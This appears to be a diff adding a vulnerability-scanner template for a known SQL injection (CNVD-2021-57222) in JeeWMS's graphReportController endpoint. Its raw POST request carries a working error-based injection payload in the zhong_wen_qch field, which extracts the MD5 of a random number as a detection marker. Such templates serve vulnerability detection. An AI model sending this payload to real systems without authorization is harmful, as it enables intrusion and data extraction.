@@ -1,0 +1,30 @@
+id: CNVD-2021-57222
+
+info:
+  name: JeeWMS GraphReportController SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template checks for an SQL Injection vulnerability in the JeeWMS GraphReportController. The payload attempts to exploit a SQL injection point by injecting a well-formed SQL payload that extracts the MD5 hash of a random integer.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-57222
+  tags: jeewms
+
+variables:
+  r1: "{{rand_int(800000000, 1000000000)}}"
+
+http:
+  - raw:
+      - |
+        POST /jeewms/graphReportController.do?datagridGraph HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        configId=khsltop10&zhong_wen_qch=' AND EXTRACTVALUE(5636,CONCAT(0x5c,0x71786a7071,(SELECT MID((IFNULL(CAST(md5({{r1}}) AS NCHAR),0x20)),1,21)),0x716b6b7071))-- ouFr
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{md5(r1)}}"
